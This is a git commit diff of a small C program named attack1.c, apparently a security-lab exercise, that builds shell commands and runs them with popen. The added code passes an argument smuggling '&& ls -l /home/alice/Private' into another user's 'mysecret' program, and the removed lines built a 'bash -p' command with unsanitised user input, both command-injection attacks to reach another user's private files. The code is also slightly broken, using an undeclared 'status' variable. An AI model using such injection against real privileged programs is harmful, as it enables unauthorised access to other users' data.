4f676298c601892e31ef1dd956ccf43646aa45c5
Blake Gong <blakegong@Blakes-MacBook-Pro.local>
2015-10-31 18:17:44 +0800

    c program for sh file

--- attack1.c
+++ attack1.c
@@ -7,18 +7,24 @@
 int main(int argc, char *argv[])
 {
 	FILE *fp;
-	char command[512];
-	
+	char command[512], result[1024];
+
+	strcpy(command, "/home/alice/Public/mysecret \"&& ls -l /home/alice/Private\"");
+
 	fp = popen(command, "r");
 	if (fp == NULL)
 		printf("ERROR");
-	
-	while (
-   strcpy(command, "/bin/bash -p -c \"echo $USER; /home/alice/Public/mysecret.sh ");
-   strcat(command, argv[1]);
-   strcat(command, "\"");
-   system(command);
 
+	while (fgets(result, 1024, fp) != NULL)
+	    printf("%s", result);
 
-   return 0;
+	status = pclose(fp);
+	if (status == -1) {
+	    /* Error reported by pclose() */
+	} else {
+	    /* Use macros described under wait() to inspect `status' in order
+	       to determine success/failure of command executed by popen() */
+	}
+
+	return 0;
 }
